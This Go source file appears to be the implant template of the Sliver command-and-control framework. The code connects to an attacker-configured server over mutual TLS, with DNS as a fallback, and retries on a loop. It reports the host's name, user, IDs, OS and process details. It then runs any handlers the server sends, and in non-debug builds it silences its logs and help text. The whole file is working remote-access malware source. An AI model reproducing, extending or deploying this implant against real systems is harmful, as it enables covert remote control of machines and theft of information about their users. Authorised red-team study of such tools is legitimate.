package main

import (
	"crypto/x509"
	"flag"
	"io"
	"os"
	"os/user"
	"runtime"

	// {{if .Debug}}
	// {{else}}
	"io/ioutil"
	// {{end}}

	"log"
	"strconv"
	"time"

	pb "sliver/protobuf"

	"github.com/golang/protobuf/proto"
)

var (
	sliverName = `{{.Name}}`
	keyPEM     = `{{.Key}}`
	certPEM    = `{{.Cert}}`
	caCertPEM  = `{{.CACert}}`

	defaultServerIP = `{{.DefaultServer}}`

	dnsParent = `{{.DNSParent}}`

	readBufSize    = 64 * 1024 // 64kb
	zeroReadsLimit = 10

	maxErrors = 100 // TODO: Make configurable

	server *string
	lport  *int

	defaultServerLport = getDefaultServerLport()
	reconnectInterval  = getReconnectInterval()
)

func main() {

	// {{if .Debug}}
	log.SetFlags(log.LstdFlags | log.Lshortfile)
	// {{else}}
	log.SetFlags(0)
	log.SetOutput(ioutil.Discard)
	// {{end}}

	server = flag.String("server", defaultServerIP, "")
	lport = flag.Int("lport", defaultServerLport, "")

	// {{if .Debug}}
	// {{else}}
	flag.Usage = func() {} // No help!
	// {{end}}

	flag.Parse()

	// {{if .Debug}}
	log.Printf("Hello my name is %s", sliverName)
	// {{end}}

	startConnectionLoop()
}

func startConnectionLoop() {
	connectionAttempts := 0
	for connectionAttempts < maxErrors {
		err := mtlsConnect()
		if err != nil {
			// {{if .Debug}}
			log.Printf("[mtls] Connection failed %s", err)
			// {{end}}
		}
		connectionAttempts++

		if dnsParent != "" {
			err = dnsConnect()
			if err != nil {
				// {{if .Debug}}
				log.Printf("[dns] Connection failed %s", err)
				// {{end}}
			}
			connectionAttempts++
		} else {
			// {{if .Debug}}
			log.Printf("No DNS parent domain configured\n")
			// {{end}}
		}

		time.Sleep(reconnectInterval)
	}
	// {{if .Debug}}
	log.Printf("[!] Max connection errors reached\n")
	// {{end}}
}

func mtlsConnect() error {
	// {{if .Debug}}
	log.Printf("Connecting -> %s:%d", *server, uint16(*lport))
	// {{end}}
	conn, err := tlsConnect(*server, uint16(*lport))
	if err != nil {
		return err
	}
	defer conn.Close()
	mtlsRegisterSliver(conn)

	send := make(chan pb.Envelope)
	defer close(send)
	go func() {
		for envelope := range send {
			socketWriteEnvelope(conn, envelope)
		}
	}()

	handlers := getSystemHandlers()
	for {
		envelope, err := socketReadEnvelope(conn)
		if err == io.EOF {
			break
		}
		if err == nil {
			if handler, ok := handlers[envelope.Type]; ok {
				go handler.(func(chan pb.Envelope, []byte))(send, envelope.Data)
			}
		}
	}

	return nil
}

func dnsConnect() error {
	// {{if .Debug}}
	log.Printf("Attempting to connect via DNS via parent: %s\n", dnsParent)
	// {{end}}
	sessionID, _, err := dnsStartSession(dnsParent)
	if err != nil {
		return err
	}
	// {{if .Debug}}
	log.Printf("Starting new session with id = %s\n", sessionID)
	// {{end}}
	return nil
}

func getDefaultServerLport() int {
	lport, err := strconv.Atoi(`{{.DefaultServerLPort}}`)
	if err != nil {
		return 8888
	}
	return lport
}

func getReconnectInterval() time.Duration {
	reconnect, err := strconv.Atoi(`{{.ReconnectInterval}}`)
	if err != nil {
		return 30 * time.Second
	}
	return time.Duration(reconnect) * time.Second
}

func getRegisterSliver() pb.Envelope {
	hostname, _ := os.Hostname()
	currentUser, _ := user.Current()
	data, _ := proto.Marshal(&pb.RegisterSliver{
		Name:     sliverName,
		Hostname: hostname,
		Username: currentUser.Username,
		Uid:      currentUser.Uid,
		Gid:      currentUser.Gid,
		Os:       runtime.GOOS,
		Arch:     runtime.GOARCH,
		Pid:      int32(os.Getpid()),
		Filename: os.Args[0],
	})
	envelope := pb.Envelope{
		Type: pb.MsgRegister,
		Data: data,
	}
	return envelope
}

// rootOnlyVerifyCertificate - Go doesn't provide a method for only skipping hostname validation so
// we have to disable all of the fucking certificate validation and re-implement everything.
// https://github.com/golang/go/issues/21971
func rootOnlyVerifyCertificate(rawCerts [][]byte, _ [][]*x509.Certificate) error {

	roots := x509.NewCertPool()
	ok := roots.AppendCertsFromPEM([]byte(caCertPEM))
	if !ok {
		// {{if .Debug}}
		log.Printf("Failed to parse root certificate")
		// {{end}}
		os.Exit(3)
	}

	cert, err := x509.ParseCertificate(rawCerts[0]) // We should only get one cert
	if err != nil {
		// {{if .Debug}}
		log.Printf("Failed to parse certificate: " + err.Error())
		// {{end}}
		return err
	}

	// Basically we only care if the certificate was signed by our authority
	// Go selects sensible defaults for time and EKU, basically we're only
	// skipping the hostname check, I think?
	options := x509.VerifyOptions{
		Roots: roots,
	}
	if _, err := cert.Verify(options); err != nil {
		// {{if .Debug}}
		log.Printf("Failed to verify certificate: " + err.Error())
		// {{end}}
		return err
	}

	return nil
}
